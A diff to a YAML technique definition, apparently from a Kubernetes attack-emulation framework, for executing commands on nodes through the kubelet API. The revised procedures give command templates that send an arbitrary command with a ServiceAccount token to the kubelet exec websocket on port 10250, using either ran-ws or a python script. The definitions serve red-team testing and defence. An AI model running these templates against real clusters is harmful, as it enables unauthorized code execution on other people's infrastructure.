@@ -1,12 +1,12 @@
-name: Execute via Node/Proxy 
+id: execute-via-get-node-proxy
+name: Execute via Node/Proxy
 description: Execute a command on a target node via the kubelet API proxy
 tactic: Execution
 techniques: ["Command and Scripting Interpreter: Unix Shell"]
 preconditions:
   accessLevel: user-exec
   kind: System
-  binary: "ran-ws"
-  # rbac: 
+  # rbac:
   # - verb: get
   #   resource: "nodes/proxy"
 parameters:
@@ -23,29 +23,20 @@ parameters:
     description: Name of the target container in the pod
   NODE:
     type: Node
-    description: Name or IP of the node on which the pod is running. 
+    description: Name or IP of the node on which the pod is running.
   COMMAND:
     type: string
     description: the command to execute in the shell
-  ARGS:
-    type: string
-    description: the arguments to pass to the command
   TOKEN:
     type: ServiceAccount
     description: the ServiceAccount token used to authorize this request
     default: ""
-  BACKGROUND:
-    type: bool
-    description: whether to run the command in the background
-    default: false
 procedures:
   - key: ran-ws
-    command: ran-ws --node ${NODE} --ns ${NAMESPACE} --pod ${POD_NAME} --container ${CONTAINER} --token ${TOKEN} --command ${COMMAND} {{ if .ARGS }} --command ${ARGS} {{ end }}
-    # command: >
-    #   {{ if .ARGS }}
-    #   TOKEN=${TOKEN} ran-ws "wss://${NODE}:10250/exec/${NAMESPACE}/${POD_NAME}/${CONTAINER}?output=1&error=1&command=${COMMAND}&command=${ARGS}"
-    #   {{ else }}
-    #   TOKEN=${TOKEN} ran-ws "wss://${NODE}:10250/exec/${NAMESPACE}/${POD_NAME}/${CONTAINER}?output=1&error=1&command=${COMMAND}"
-    #   {{ end}}
-# defend: {
-refernces:
+    tool: ran-ws
+    command: >
+      ran-ws --url "wss://${NODE}:10250/exec/${NAMESPACE}/${POD_NAME}/${CONTAINER}?output=1&error=1&command=${COMMAND}" --token ${TOKEN}
+  - key: python-ws
+    tool: python3
+    command: >
+      TOKEN=${TOKEN} python3 ws.py "wss://${NODE}:10250/exec/${NAMESPACE}/${POD_NAME}/${CONTAINER}?output=1&error=1&command=${COMMAND}"
